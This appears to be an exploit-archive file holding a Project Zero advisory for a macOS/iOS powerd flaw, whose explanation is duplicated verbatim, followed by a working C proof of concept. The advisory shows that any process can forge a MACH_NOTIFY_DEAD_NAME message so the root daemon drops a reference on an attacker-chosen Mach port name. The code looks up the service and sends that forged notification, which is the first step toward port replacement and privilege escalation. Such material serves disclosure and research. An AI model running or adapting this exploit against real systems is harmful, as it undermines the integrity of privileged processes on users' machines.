@@ -1,0 +1,263 @@
+/*
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=976
+
+powerd (running as root) hosts the com.apple.PowerManagement.control mach service.
+
+It checks in with launchd to get a server port and then wraps that in a CFPort:
+
+  pmServerMachPort = _SC_CFMachPortCreateWithPort(
+                          "PowerManagement",
+                          serverPort, 
+                          mig_server_callback, 
+                          &context);
+
+It also asks to receive dead name notifications for other ports on that same server port:
+
+  mach_port_request_notification(
+              mach_task_self(),           // task
+              notify_port_in,                 // port that will die
+              MACH_NOTIFY_DEAD_NAME,      // msgid
+              1,                          // make-send count
+              CFMachPortGetPort(pmServerMachPort),        // notify port
+              MACH_MSG_TYPE_MAKE_SEND_ONCE,               // notifyPoly
+              &oldNotify);                                // previous
+
+mig_server_callback is called off of the mach port run loop source to handle new messages on pmServerMachPort:
+
+  static void
+  mig_server_callback(CFMachPortRef port, void *msg, CFIndex size, void *info)
+  {
+      mig_reply_error_t * bufRequest = msg;
+      mig_reply_error_t * bufReply = CFAllocatorAllocate(
+          NULL, _powermanagement_subsystem.maxsize, 0);
+      mach_msg_return_t   mr;
+      int                 options;
+
+      __MACH_PORT_DEBUG(true, "mig_server_callback", serverPort);
+      
+      /* we have a request message */
+      (void) pm_mig_demux(&bufRequest->Head, &bufReply->Head);
+
+This passes the raw message to pm_mig_demux:
+
+  static boolean_t 
+  pm_mig_demux(
+      mach_msg_header_t * request,
+      mach_msg_header_t * reply)
+  {
+      mach_dead_name_notification_t *deadRequest = 
+                      (mach_dead_name_notification_t *)request;
+      boolean_t processed = FALSE;
+
+      processed = powermanagement_server(request, reply);
+
+      if (processed) 
+          return true;
+      
+      if (MACH_NOTIFY_DEAD_NAME == request->msgh_id) 
+      {
+          __MACH_PORT_DEBUG(true, "pm_mig_demux: Dead name port should have 1+ send right(s)", deadRequest->not_port);
+
+          PMConnectionHandleDeadName(deadRequest->not_port);
+
+          __MACH_PORT_DEBUG(true, "pm_mig_demux: Deallocating dead name port", deadRequest->not_port);
+          mach_port_deallocate(mach_task_self(), deadRequest->not_port);
+          
+          reply->msgh_bits            = 0;
+          reply->msgh_remote_port     = MACH_PORT_NULL;
+
+          return TRUE;
+      }
+
+This passes the message to the MIG-generated code for the powermanagement subsystem, if that fails (because the msgh_id doesn't
+match the subsystem for example) then this compares the message's msgh_id field to MACH_NOTIFY_DEAD_NAME.
+
+deadRequest is the message cast to a mach_dead_name_notification_t which is defined like this in mach/notify.h:
+
+  typedef struct {
+      mach_msg_header_t   not_header;
+      NDR_record_t        NDR;
+      mach_port_name_t not_port;/* MACH_MSG_TYPE_PORT_NAME */
+      mach_msg_format_0_trailer_t trailer;
+  } mach_dead_name_notification_t;
+
+This is a simple message, not a complex one. not_port is just a completely controlled integer which in this case will get passed directly to
+mach_port_deallocate.
+
+The powerd code expects that only the kernel will send a MACH_NOTIFY_DEAD_NAME message but actually anyone can send this and force the privileged process
+to drop a reference on a controlled mach port name :)
+
+Multiplexing these two things (notifications and a mach service) onto the same port isn't possible to do safely as the kernel doesn't prevent
+user->user spoofing of notification messages - usually this wouldn't be a problem as attackers shouldn't have access to the notification port.
+
+You could use this bug to replace a mach port name in powerd (eg the bootstrap port, an IOService port etc) with a one for which the attacker holds the receieve right.
+
+Since there's still no KDK for 10.12.1 you can test this by attaching to powerd in userspace and setting a breakpoint in pm_mig_demux at the
+mach_port_deallocate call and you'll see the controlled value in rsi.
+
+Tested on MacBookAir5,2 MacOS Sierra 10.12.1 (16B2555)
+ */
+
+// ianbeer
+
+#if 0
+MacOS/iOS arbitrary port replacement in powerd
+
+powerd (running as root) hosts the com.apple.PowerManagement.control mach service.
+
+It checks in with launchd to get a server port and then wraps that in a CFPort:
+
+	pmServerMachPort = _SC_CFMachPortCreateWithPort(
+													"PowerManagement",
+													serverPort, 
+													mig_server_callback, 
+													&context);
+
+It also asks to receive dead name notifications for other ports on that same server port:
+
+	mach_port_request_notification(
+							mach_task_self(),           // task
+							notify_port_in,                 // port that will die
+							MACH_NOTIFY_DEAD_NAME,      // msgid
+							1,                          // make-send count
+							CFMachPortGetPort(pmServerMachPort),        // notify port
+							MACH_MSG_TYPE_MAKE_SEND_ONCE,               // notifyPoly
+							&oldNotify);                                // previous
+
+mig_server_callback is called off of the mach port run loop source to handle new messages on pmServerMachPort:
+
+	static void
+	mig_server_callback(CFMachPortRef port, void *msg, CFIndex size, void *info)
+	{
+			mig_reply_error_t * bufRequest = msg;
+			mig_reply_error_t * bufReply = CFAllocatorAllocate(
+					NULL, _powermanagement_subsystem.maxsize, 0);
+			mach_msg_return_t   mr;
+			int                 options;
+
+			__MACH_PORT_DEBUG(true, "mig_server_callback", serverPort);
+			
+			/* we have a request message */
+			(void) pm_mig_demux(&bufRequest->Head, &bufReply->Head);
+
+This passes the raw message to pm_mig_demux:
+
+	static boolean_t 
+	pm_mig_demux(
+			mach_msg_header_t * request,
+			mach_msg_header_t * reply)
+	{
+			mach_dead_name_notification_t *deadRequest = 
+											(mach_dead_name_notification_t *)request;
+			boolean_t processed = FALSE;
+
+			processed = powermanagement_server(request, reply);
+
+			if (processed) 
+					return true;
+			
+			if (MACH_NOTIFY_DEAD_NAME == request->msgh_id) 
+			{
+					__MACH_PORT_DEBUG(true, "pm_mig_demux: Dead name port should have 1+ send right(s)", deadRequest->not_port);
+
+					PMConnectionHandleDeadName(deadRequest->not_port);
+
+					__MACH_PORT_DEBUG(true, "pm_mig_demux: Deallocating dead name port", deadRequest->not_port);
+					mach_port_deallocate(mach_task_self(), deadRequest->not_port);
+					
+					reply->msgh_bits            = 0;
+					reply->msgh_remote_port     = MACH_PORT_NULL;
+
+					return TRUE;
+			}
+
+This passes the message to the MIG-generated code for the powermanagement subsystem, if that fails (because the msgh_id doesn't
+match the subsystem for example) then this compares the message's msgh_id field to MACH_NOTIFY_DEAD_NAME.
+
+deadRequest is the message cast to a mach_dead_name_notification_t which is defined like this in mach/notify.h:
+
+	typedef struct {
+			mach_msg_header_t   not_header;
+			NDR_record_t        NDR;
+			mach_port_name_t not_port;/* MACH_MSG_TYPE_PORT_NAME */
+			mach_msg_format_0_trailer_t trailer;
+	} mach_dead_name_notification_t;
+
+This is a simple message, not a complex one. not_port is just a completely controlled integer which in this case will get passed directly to
+mach_port_deallocate.
+
+The powerd code expects that only the kernel will send a MACH_NOTIFY_DEAD_NAME message but actually anyone can send this and force the privileged process
+to drop a reference on a controlled mach port name :)
+
+Multiplexing these two things (notifications and a mach service) onto the same port isn't possible to do safely as the kernel doesn't prevent
+user->user spoofing of notification messages - usually this wouldn't be a problem as attackers shouldn't have access to the notification port.
+
+You could use this bug to replace a mach port name in powerd (eg the bootstrap port, an IOService port etc) with a one for which the attacker holds the receieve right.
+
+Since there's still no KDK for 10.12.1 you can test this by attaching to powerd in userspace and setting a breakpoint in pm_mig_demux at the
+mach_port_deallocate call and you'll see the controlled value in rsi.
+
+Tested on MacBookAir5,2 MacOS Sierra 10.12.1 (16B2555)
+#endif
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+#include <servers/bootstrap.h>
+#include <mach/mach.h>
+#include <mach/ndr.h>
+
+char* service_name = "com.apple.PowerManagement.control";
+
+struct notification_msg {
+    mach_msg_header_t   not_header;
+    NDR_record_t        NDR;
+    mach_port_name_t not_port;
+};
+
+mach_port_t lookup(char* name) {
+  mach_port_t service_port = MACH_PORT_NULL;
+  kern_return_t err = bootstrap_look_up(bootstrap_port, name, &service_port);
+  if(err != KERN_SUCCESS){
+    printf("unable to look up %s\n", name);
+    return MACH_PORT_NULL;
+  }
+  
+  return service_port;
+}
+
+int main() {
+  kern_return_t err;
+
+  mach_port_t service_port = lookup(service_name);
+
+  mach_port_name_t target_port = 0x1234; // the name of the port in the target namespace to destroy
+
+  printf("%d\n", getpid());
+  printf("service port: %x\n", service_port);
+
+	struct notification_msg not = {0};
+
+  not.not_header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
+  not.not_header.msgh_size = sizeof(struct notification_msg);
+  not.not_header.msgh_remote_port = service_port;
+  not.not_header.msgh_local_port = MACH_PORT_NULL;
+  not.not_header.msgh_id = 0110; // MACH_NOTIFY_DEAD_NAME
+
+	not.NDR = NDR_record;
+
+	not.not_port = target_port;
+
+  // send the fake notification message
+  err = mach_msg(&not.not_header,
+                 MACH_SEND_MSG|MACH_MSG_OPTION_NONE,
+                 (mach_msg_size_t)sizeof(struct notification_msg),
+                 0,
+                 MACH_PORT_NULL,
+                 MACH_MSG_TIMEOUT_NONE,
+                 MACH_PORT_NULL); 
+  printf("fake notification message: %s\n", mach_error_string(err));
+  
+  return 0;
+}
